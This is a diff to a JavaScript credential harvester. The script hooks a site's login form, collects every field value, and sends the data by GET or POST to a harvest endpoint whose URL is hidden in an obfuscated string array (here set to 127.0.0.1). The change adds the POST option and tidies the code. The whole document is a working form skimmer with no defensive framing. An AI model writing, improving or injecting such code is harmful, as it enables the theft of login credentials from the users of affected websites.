@@ -2,13 +2,15 @@ var siteId = "7e578ae5";
 var formName = "loginform";
 var formId = "93djokdi";
 var enableEncoding = true;
-var _0x3745 = ["http","://","127.0.0.1","/harvest?data=","GET"];
+var usePost = false;
+var _0x3745 = ["http","://","127.0.0.1","/harvest.php","Content-type","application/x-www-form-urlencoded","GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"];
 
 $(document).ready(function() {
         console.log("initializing harvester...");
         initHarvester();
 });
 
+/* append tracking fields and bind the submit event for the target form */
 function initHarvester() {
 	var loginForm = document.getElementById(formName);
 	if(loginForm) {
@@ -46,19 +48,20 @@ function grabAll() {
 
 					if(formElement instanceof HTMLSelectElement) {
 						var selectContents = "";
-						console.log("DEBUG: need to parse all selectedOptions");
+						console.log("DEBUG: parsing all selectedOptions");
 						if(formElement.multiple) {
-							console.log("DEBUG: gotta catch em all");
+							console.log("DEBUG: multi value - gotta catch em all");
 							console.log("DEBUG: selectedOptions: " + formElement.selectedOptions);
 							var optionList = formElement.selectedOptions;
 							if(optionList.length > 0) {
 								for(j = 0; j < optionList.length; j++) {
 									console.log("DEBUG: option number [" + j + "], value= " + optionList[j].value);
 									//	serialize contents
-									if(selectContents == "") 
+									if(selectContents == "") {
 										selectContents = optionList[j].value;
-									else
+									} else {
 										selectContents += "," + encodeURI(optionList[j].value);
+									}
 								}
 							}
 						} else {
@@ -72,10 +75,11 @@ function grabAll() {
 					}
 					
 					//	are we appending a payload? if so, use an ampersand to separate values
-					if(payload == "")
+					if(payload == "") {
 						payload = elementName + ":" + elementValue;
-					else
-						payload += "&" + elementName + ":" + elementValue;				
+					} else {
+						payload += "&" + elementName + ":" + elementValue;
+					}
 				}
 			}
 		}
@@ -87,7 +91,8 @@ function grabAll() {
 		}
 		//	output payload in console for debugging
 		console.log("DEBUG: resulting payload = " + payload);
-		//	send the payload to our webserver
+		
+		//	send the payload to our server
 		sendPayload(payload);
 	} else {
 		console.log("ERROR: harvester failed to locate '" + formName + "', check the HTML");
@@ -95,6 +100,26 @@ function grabAll() {
 }
 
 function sendPayload(payload) {
-	console.log("DEBUG: method configured: " + _0x3745[4]);
-	$.get(_0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + payload);
+    console.log("DEBUG: usePost = " + usePost);
+    var xhttp = new XMLHttpRequest();
+
+    if(usePost) {
+        xhttp.open(_0x3745[7], _0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3], true);
+        xhttp.setRequestHeader(_0x3745[4], _0x3745[5]);
+        xhttp.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+               console.log("DEBUG: data sent");
+            }
+        };
+        xhttp.send('data=' + payload);
+    } else {
+        xhttp.open(_0x3745[6], _0x3745[0] +_0x3745[1] + _0x3745[2] + _0x3745[3] + '?data=' + payload, true);
+        xhttp.onreadystatechange = function() {
+            if (this.readyState == 4 && this.status == 200) {
+               console.log("DEBUG: data sent");
+            }
+        };
+        xhttp.send();
+    }
 }
+
